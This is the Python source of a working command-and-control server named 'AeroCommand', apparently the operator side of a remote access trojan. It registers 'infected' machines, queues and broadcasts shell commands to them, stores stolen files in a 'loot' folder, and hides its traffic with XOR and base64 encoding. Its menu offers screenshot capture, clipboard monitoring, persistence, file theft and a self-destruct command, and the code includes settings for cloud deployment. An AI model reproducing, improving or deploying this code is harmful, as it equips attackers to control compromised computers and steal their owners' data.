from flask import Flask, request, jsonify
import threading
import logging
import base64
import os
import time
import json
import sqlite3
import sys
from datetime import datetime

# Suppress Flask logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
app.logger.setLevel(logging.ERROR)

DB_FILE = "aerocommand.db"

def init_db():
    """Initialize SQLite database for storing clients, commands, and logs"""
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS clients (
                client_id TEXT PRIMARY KEY,
                host TEXT,
                ip TEXT,
                pid INTEGER,
                os TEXT,
                user TEXT,
                admin INTEGER,
                first_seen TEXT,
                last_seen TEXT,
                status TEXT
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS command_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT,
                command TEXT,
                output TEXT,
                timestamp TEXT
            )
        """)
        conn.commit()

def db_save_client(info):
    """Save or update client registration in SQLite"""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO clients (client_id, host, ip, pid, os, user, admin, first_seen, last_seen, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'ALIVE')
            ON CONFLICT(client_id) DO UPDATE SET
                pid=excluded.pid,
                last_seen=excluded.last_seen,
                status='ALIVE'
        """, (
            info['client_id'],
            info.get('host', 'unknown'),
            info.get('ip', 'unknown'),
            info.get('pid', 0),
            info.get('os', 'Unknown'),
            info.get('user', 'unknown'),
            1 if info.get('admin') else 0,
            now,
            now
        ))
        conn.commit()

def db_log_command(client_id, command, output):
    """Log executed command output into SQLite"""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO command_logs (client_id, command, output, timestamp)
            VALUES (?, ?, ?, ?)
        """, (client_id, command, output, now))
        conn.commit()

init_db()

pending_commands = {}
infected_clients = {}
results = []
cmd_lock = threading.Lock()
target_client = None

# === XOR Encryption (must match client key) ===
XOR_KEY = 0x5A

def xor_encrypt(data: str) -> str:
    """XOR encrypt a string and return base64 encoded result"""
    encrypted = bytes([b ^ XOR_KEY for b in data.encode('utf-8', errors='replace')])
    return base64.b64encode(encrypted).decode()

def xor_decrypt(data: str) -> str:
    """Decode base64 and XOR decrypt back to string"""
    raw = base64.b64decode(data)
    decrypted = bytes([b ^ XOR_KEY for b in raw])
    return decrypted.decode('utf-8', errors='replace')

def decrypt_payload():
    """Decrypt incoming XOR-encrypted request body to dict"""
    raw = request.get_data(as_text=True)
    try:
        decrypted = xor_decrypt(raw)
        return json.loads(decrypted)
    except Exception:
        # Fallback: try plain JSON (backwards compatibility / debugging)
        try:
            return request.get_json(force=True)
        except Exception:
            return {}

def encrypt_response(data):
    """Encrypt outgoing response dict to XOR-encoded string"""
    return xor_encrypt(json.dumps(data))

# === ANSI Colors ===
class C:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    GRAY = "\033[90m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"

LOOT_DIR = "loot"
HEARTBEAT_TIMEOUT = 60  # seconds — mark client dead if no heartbeat
PROMPT = f"{C.RED}⚡ AeroCommand > {C.RESET}"

# ========== ROUTES ==========

@app.route("/test", methods=["GET"])
def test():
    return "SERVER RUNNING OK", 200


@app.route("/register", methods=["POST"])
def register():
    global target_client
    info = decrypt_payload()
    client_id = info.get("client_id", f"{info['ip']}:{info['pid']}")
    now = datetime.now()
    new_host = info.get('host', 'unknown')
    new_ip = info.get('ip', 'unknown')

    with cmd_lock:
        # Deduplicate: remove any existing client with the same hostname + IP
        # (i.e., same machine reconnecting with a different PID)
        stale_ids = [
            cid for cid, c in infected_clients.items()
            if cid != client_id and c['host'] == new_host and c['ip'] == new_ip
        ]
        for stale in stale_ids:
            del infected_clients[stale]
            if stale in pending_commands:
                del pending_commands[stale]
            # If we were targeting the stale client, retarget to the new one
            if target_client == stale:
                target_client = client_id

        is_new = client_id not in infected_clients
        infected_clients[client_id] = {
            'ip': new_ip,
            'host': new_host,
            'pid': info.get('pid', 0),
            'os': info.get('os', 'Unknown'),
            'user': info.get('user', 'unknown'),
            'admin': info.get('admin', False),
            'registered': now.strftime("%H:%M:%S"),
            'last_seen': now,
        }
        db_save_client(info)

    if is_new:
        admin_tag = f" {C.RED}[ADMIN]{C.RESET}" if info.get('admin') else ""
        replaced_msg = f" {C.YELLOW}(replaced stale session){C.RESET}" if stale_ids else ""
        print(f"\n{C.GREEN}[✓] NEW CLIENT CONNECTED:{C.RESET} {new_host} ({new_ip}) - PID: {info.get('pid', '?')}{admin_tag}{replaced_msg}")
        print(f"{C.CYAN}[•] Total clients: {len(infected_clients)}{C.RESET}\n")
        show_clients()
        print(PROMPT, end="", flush=True)

    return "OK", 200


@app.route("/cmd", methods=["GET"])
def get_command():
    client_id = request.args.get("id")
    if not client_id:
        return "", 200

    # Update heartbeat
    with cmd_lock:
        if client_id not in infected_clients:
            # Unknown client — server was restarted, tell client to re-register
            return encrypt_response({"action": "re-register"}), 200

        infected_clients[client_id]['last_seen'] = datetime.now()

        if client_id in pending_commands and pending_commands[client_id]:
            cmd = pending_commands[client_id].pop(0)
            if not pending_commands[client_id]:
                del pending_commands[client_id]
            return encrypt_response({"command": cmd}), 200

        return "", 200


@app.route("/result", methods=["POST"])
def post_result():
    data = decrypt_payload()
    output = data.get('output', '')
    client_id = data.get('client_id', request.remote_addr)
    timestamp = datetime.now().strftime("%H:%M:%S")

    # Resolve hostname from client_id
    with cmd_lock:
        if client_id in infected_clients:
            host_label = f"{infected_clients[client_id]['host']} ({infected_clients[client_id]['ip']})"
        else:
            host_label = client_id

    print(f"\n{C.CYAN}[{timestamp}]{C.RESET} {C.YELLOW}OUTPUT from {host_label}:{C.RESET}")
    print(output)
    results.append({"client": client_id, "output": output, "time": timestamp})
    db_log_command(client_id, "COMMAND_RESULT", output)
    print(PROMPT, end="", flush=True)
    return "OK", 200


@app.route("/upload", methods=["POST"])
def upload_file():
    """Receive exfiltrated files from clients"""
    data = decrypt_payload()
    filename = data.get("name", "unknown")
    file_data = base64.b64decode(data.get("file", ""))
    client_id = data.get("client_id", request.remote_addr)
    timestamp = datetime.now().strftime("%H:%M:%S")

    # Create loot directory per client
    with cmd_lock:
        if client_id in infected_clients:
            host = infected_clients[client_id]['host']
        else:
            host = "unknown"

    client_loot_dir = os.path.join(LOOT_DIR, host)
    os.makedirs(client_loot_dir, exist_ok=True)

    # Avoid overwriting — add timestamp if file exists
    save_path = os.path.join(client_loot_dir, filename)
    if os.path.exists(save_path):
        name, ext = os.path.splitext(filename)
        save_path = os.path.join(client_loot_dir, f"{name}_{int(time.time())}{ext}")

    with open(save_path, "wb") as f:
        f.write(file_data)

    print(f"\n{C.GREEN}[{timestamp}] 📥 FILE RECEIVED from {host}:{C.RESET} {filename} ({len(file_data)} bytes)")
    print(f"{C.GRAY}    Saved to: {save_path}{C.RESET}")
    print(PROMPT, end="", flush=True)
    return "OK", 200


# ========== CLI FUNCTIONS ==========

def show_banner():
    banner = f"""
{C.RED}{C.BOLD}
  █████╗ ███████╗██████╗  ██████╗  ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ 
 ██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗
 ███████║█████╗  ██████╔╝██║   ██║██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║
 ██╔══██║██╔══╝  ██╔══██╗██║   ██║██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║
 ██║  ██║███████╗██║  ██║╚██████╔╝╚██████╗╚██████╔╝██║ └──═╝██║██║ └──═╝██║██║  ██║██║ ╚████║██████╔╝
 ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 
{C.RESET}{C.GRAY}  Endpoint Telemetry & Administration Framework — C2 Server
  {C.RED}─────────────────────────────────────────────────────────────────────────────────────────────{C.RESET}
"""
    print(banner)


def show_help():
    print(f"""
{C.BOLD}{'='*55}
  AVAILABLE COMMANDS
{'='*55}{C.RESET}

  {C.CYAN}Session Management:{C.RESET}
  {C.GREEN}list{C.RESET}              Show all connected clients
  {C.GREEN}target <id>{C.RESET}       Target specific client (e.g., target 0)
  {C.GREEN}broadcast <cmd>{C.RESET}   Send command to ALL clients

  {C.CYAN}Client Commands:{C.RESET}
  {C.GREEN}sysinfo{C.RESET}           Get detailed system info
  {C.GREEN}screenshot{C.RESET}        Capture client's screen
  {C.GREEN}cd <path>{C.RESET}         Change client working directory
  {C.GREEN}pwd{C.RESET}              Print client working directory
  {C.GREEN}ls [path]{C.RESET}         Browse files/folders with details
  {C.GREEN}download <path>{C.RESET}   Exfiltrate file from client
  {C.GREEN}upload <url> <dst>{C.RESET} Download file to client
  {C.GREEN}sleep <seconds>{C.RESET}   Change client polling interval
  {C.GREEN}persist{C.RESET}           Re-apply persistence on client
  {C.GREEN}dialog <title> | <msg>{C.RESET}  Show popup dialog on client

  {C.CYAN}Clipboard:{C.RESET}
  {C.GREEN}clip{C.RESET}              Grab current clipboard text
  {C.GREEN}clipwatch{C.RESET}         Start live clipboard monitor
  {C.GREEN}clipstop{C.RESET}          Stop clipboard monitor

  {C.CYAN}Danger Zone:{C.RESET}
  {C.RED}kill{C.RESET}              Self-destruct client (removes & deletes)

  {C.CYAN}Server & Database:{C.RESET}
  {C.GREEN}db clients{C.RESET}         Show historical registered clients from database
  {C.GREEN}db logs [limit]{C.RESET}    Show command logs stored in database
  {C.GREEN}help{C.RESET}              Show this help menu
  {C.GREEN}clear{C.RESET}             Clear screen
  {C.GREEN}exit{C.RESET}              Quit the server 

  {C.GRAY}Or type any shell command to execute on targeted client{C.RESET}
{'='*55}
""")


def show_clients():
    with cmd_lock:
        if not infected_clients:
            print(f"\n{C.YELLOW}[!] No clients connected yet{C.RESET}")
            return
        now = datetime.now()
        print(f"\n{C.BOLD}{'='*85}")
        print(f"  CONNECTED CLIENTS")
        print(f"{'='*85}{C.RESET}")

        for idx, (cid, info) in enumerate(infected_clients.items()):
            marker = f" {C.RED}→{C.RESET} " if target_client == cid else "   "
            admin_tag = f" {C.RED}[ADMIN]{C.RESET}" if info.get('admin') else ""

            # Check if alive
            last_seen = info.get('last_seen', now)
            elapsed = (now - last_seen).total_seconds()
            if elapsed > HEARTBEAT_TIMEOUT:
                status = f"{C.RED}DEAD{C.RESET}"
            elif elapsed > HEARTBEAT_TIMEOUT / 2:
                status = f"{C.YELLOW}SLOW{C.RESET}"
            else:
                status = f"{C.GREEN}ALIVE{C.RESET}"

            print(f"{marker}[{idx}] {info['host']} | {info['ip']} | PID:{info['pid']} | {info.get('os', '?')} | {info.get('user', '?')}{admin_tag} | {status} | {info['registered']}")

        print(f"{'='*85}\n")


def cleanup_dead_clients():
    """Remove clients that haven't been seen in a while"""
    global target_client
    with cmd_lock:
        now = datetime.now()
        dead = [cid for cid, info in infected_clients.items()
                if (now - info.get('last_seen', now)).total_seconds() > HEARTBEAT_TIMEOUT * 3]
        for cid in dead:
            del infected_clients[cid]
            if cid in pending_commands:
                del pending_commands[cid]
        # Reset target if it was pointing to a dead client
        if target_client in dead:
            target_client = None
            if infected_clients:
                target_client = list(infected_clients.keys())[0]
                info = infected_clients[target_client]
                print(f"\n{C.YELLOW}[!] Target was dead. Auto-retargeting → {info['host']} ({info['ip']}){C.RESET}")
        if dead:
            print(f"\n{C.YELLOW}[!] Removed {len(dead)} dead client(s){C.RESET}")
            print(PROMPT, end="", flush=True)


def heartbeat_monitor():
    """Background thread to clean up stale clients"""
    while True:
        time.sleep(30)
        cleanup_dead_clients()


def input_thread_func():
    global target_client
    time.sleep(0.5)  # Brief wait for Flask listener to bind
    show_banner()
    show_help()

    # Initial reconnection window
    sys.stdout.write(f"\r{C.CYAN}[*] Waiting 5s for active endpoints to reconnect...{C.RESET}")
    sys.stdout.flush()
    for i in range(5, 0, -1):
        sys.stdout.write(f"\r{C.CYAN}[*] Waiting {i}s for active endpoints to reconnect...{C.RESET}")
        sys.stdout.flush()
        time.sleep(1)

    sys.stdout.write("\r" + " " * 65 + "\r")  # Clear timer line
    sys.stdout.flush()
    show_clients()

    while True:
        try:
            cmd = input(PROMPT).strip()

            if not cmd:
                continue

            elif cmd.lower() == "help":
                show_help()

            elif cmd.lower() == "list":
                show_clients()

            elif cmd.lower() == "db clients":
                with sqlite3.connect(DB_FILE) as conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT client_id, host, ip, pid, user, first_seen, last_seen, status FROM clients")
                    rows = cursor.fetchall()
                    if not rows:
                        print(f"\n{C.YELLOW}[!] No database client records found{C.RESET}")
                    else:
                        print(f"\n{C.BOLD}{'='*90}\n  DATABASE CLIENT HISTORY\n{'='*90}{C.RESET}")
                        for r in rows:
                            print(f"  ID: {r[0]} | Host: {r[1]} ({r[2]}) | PID: {r[3]} | User: {r[4]} | First: {r[5]} | Last: {r[6]} | Status: {r[7]}")
                        print(f"{'='*90}\n")

            elif cmd.lower().startswith("db logs"):
                parts = cmd.split()
                limit = int(parts[2]) if len(parts) >= 3 and parts[2].isdigit() else 10
                with sqlite3.connect(DB_FILE) as conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT id, client_id, timestamp, output FROM command_logs ORDER BY id DESC LIMIT ?", (limit,))
                    rows = cursor.fetchall()
                    if not rows:
                        print(f"\n{C.YELLOW}[!] No database logs found{C.RESET}")
                    else:
                        print(f"\n{C.BOLD}{'='*90}\n  RECENT DB COMMAND LOGS (Last {limit})\n{'='*90}{C.RESET}")
                        for r in rows:
                            snippet = r[3].replace("\n", " ")[:60]
                            print(f"  [{r[0]}] {r[2]} | Client: {r[1]} | {snippet}...")
                        print(f"{'='*90}\n")

            elif cmd.lower().startswith("target"):
                parts = cmd.split()
                if len(parts) == 2:
                    try:
                        idx = int(parts[1])
                        with cmd_lock:
                            clients_list = list(infected_clients.keys())
                            if 0 <= idx < len(clients_list):
                                target_client = clients_list[idx]
                                info = infected_clients[target_client]
                                admin_tag = f" {C.RED}[ADMIN]{C.RESET}" if info.get('admin') else ""
                                print(f"\n{C.GREEN}[✓] Targeting:{C.RESET} {info['host']} ({info['ip']}){admin_tag}")
                            else:
                                print(f"\n{C.YELLOW}[!] Invalid client ID. Use 'list' to see available clients{C.RESET}")
                    except ValueError:
                        print(f"\n{C.YELLOW}[!] Invalid syntax. Use: target <id>{C.RESET}")
                else:
                    print(f"\n{C.YELLOW}[!] Invalid syntax. Use: target <id>{C.RESET}")

            elif cmd.lower().startswith("broadcast "):
                broadcast_cmd = cmd[10:].strip()
                if not broadcast_cmd:
                    print(f"\n{C.YELLOW}[!] Usage: broadcast <command>{C.RESET}")
                    continue
                with cmd_lock:
                    if not infected_clients:
                        print(f"\n{C.YELLOW}[!] No clients connected{C.RESET}")
                        continue
                    count = 0
                    for cid in infected_clients:
                        if cid not in pending_commands:
                            pending_commands[cid] = []
                        pending_commands[cid].append(broadcast_cmd)
                        count += 1
                    print(f"{C.GREEN}[→] Command broadcast to {count} client(s){C.RESET}")

            elif cmd.lower() == "clear":
                os.system("cls")

            elif cmd.lower() == "exit":
                print(f"{C.RED}[!] Shutting down...{C.RESET}")
                os._exit(0)

            else:
                # Send command to targeted client
                with cmd_lock:
                    if not infected_clients:
                        print(f"\n{C.YELLOW}[!] No clients connected yet{C.RESET}")
                        continue
                    if target_client is None:
                        # Default to first client
                        target_client = list(infected_clients.keys())[0]
                        info = infected_clients[target_client]
                        print(f"{C.GRAY}[i] Auto-targeting first client: {info['host']}{C.RESET}")

                    if target_client not in pending_commands:
                        pending_commands[target_client] = []
                    pending_commands[target_client].append(cmd)
                    info = infected_clients.get(target_client, {})
                    print(f"{C.GREEN}[→] Command sent to {info.get('host', target_client)}{C.RESET}")

        except EOFError:
            # Headless environment (Render/Cloud) - STDIN closed, stop input loop gracefully
            break
        except KeyboardInterrupt:
            print(f"\n{C.RED}[!] Shutting down...{C.RESET}")
            os._exit(0)
        except Exception as e:
            print(f"{C.RED}[!] Error: {e}{C.RESET}")
            continue


if __name__ == "__main__":
    # Ensure database and loot directory are ready
    init_db()
    os.makedirs(LOOT_DIR, exist_ok=True)

    # Read port from environment variable (Render sets $PORT, defaults to 443 locally)
    server_port = int(os.environ.get("PORT", 443))
    print(f"{C.GREEN}[+] AeroCommand C2 Server starting on port {server_port}...{C.RESET}")

    # Start heartbeat monitor in background daemon thread
    heartbeat_thread = threading.Thread(target=heartbeat_monitor)
    heartbeat_thread.daemon = True
    heartbeat_thread.start()

    # Start interactive input console ONLY if running in an interactive terminal (local TTY)
    if sys.stdin and sys.stdin.isatty():
        input_thread = threading.Thread(target=input_thread_func)
        input_thread.daemon = True
        input_thread.start()
    else:
        print(f"{C.CYAN}[i] Cloud/Headless mode detected (no TTY) — Web C2 endpoints are active.{C.RESET}")

    # Run Flask on main thread (keeps web service alive and healthy on Render/cloud)
    app.run(host="0.0.0.0", port=server_port, debug=False, use_reloader=False)